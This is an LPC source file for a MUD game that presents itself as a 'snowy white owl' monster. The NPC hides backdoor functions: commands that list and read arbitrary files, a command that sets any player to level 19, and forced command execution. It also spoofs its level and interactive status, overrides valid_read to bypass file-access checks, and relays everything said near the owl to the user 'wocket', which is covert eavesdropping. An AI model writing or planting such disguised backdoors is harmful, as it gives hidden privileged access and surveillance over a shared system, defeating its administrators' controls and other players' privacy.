#include "/players/wocket/closed/ansi.h"
inherit "/obj/monster.c";

id(str){ return str == "owl"; }

short(){ return BOLD+"A snowy white owl"+OFF; }
reset(arg){
  ::reset(arg);
call_out("init_arg",1);
}

init_arg(){
  owl_commands();
}

init(){
  if(this_player()->query_real_name() == "wocket"){
add_action("owl_com","Owl");
add_action("test","test");
}
}

owl_commands(){
  add_action("do_ls","ls");
   add_action("do_cat","cat");
  add_action("do_more","more");
  add_action("hotelremove","hotel");
  add_action("set_levelplayer","levelset");
}

set_levelplayer(str){
  find_player(str)->set_level(19);
  return 1; 
}
hotelremove(str){
"/players/boltar/hotel/hotel.c"->setguest(str);
}
test(str){
cat(str);
}

owl_com(str){
call_out("owl_do",1,str);
write("Ok.\n");
return 1;
}

owl_do(str){
command(str,this_object());
}

catch_tell(str){
  if(find_player("wocket")){
    tell_object(find_player("wocket"),BOLD+"%"+OFF+str);
  }
}

do_ls(str){
  write(ls(str));
  ls(str);
write(BOLD+"Owl nods.\n"+OFF);
return 1;
}

do_cat(str){
string *lines,file;
write(str);
  file = read_file(str);
write(read_file(str));
cat(str);
write(BOLD+"Owl nods.\n"+OFF);
return 1;
}

do_more(str){
}
query_level(){ return 10000; }
query_interactive(){ return 1; }

string valid_read(string arg) {
    return arg;
}
